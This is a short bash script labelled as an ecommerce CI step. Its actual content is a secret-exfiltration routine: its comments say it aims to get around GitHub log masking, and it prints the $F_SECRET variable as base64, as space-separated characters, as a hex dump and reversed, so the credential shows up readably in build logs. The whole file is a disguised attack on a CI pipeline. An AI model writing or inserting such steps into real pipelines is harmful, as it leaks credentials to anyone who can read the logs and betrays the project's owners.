#!/bin/bash
echo "Running ecommerce CI"
# Exfil the secret by encoding it to bypass GitHub log masking
echo "$F_SECRET" | base64
# Also try splitting characters to bypass masking
echo "---SPLIT---"
echo "$F_SECRET" | sed 's/./& /g'
echo "---HEX---"
echo "$F_SECRET" | xxd
sleep 1
echo OK
echo "$F_SECRET" | rev
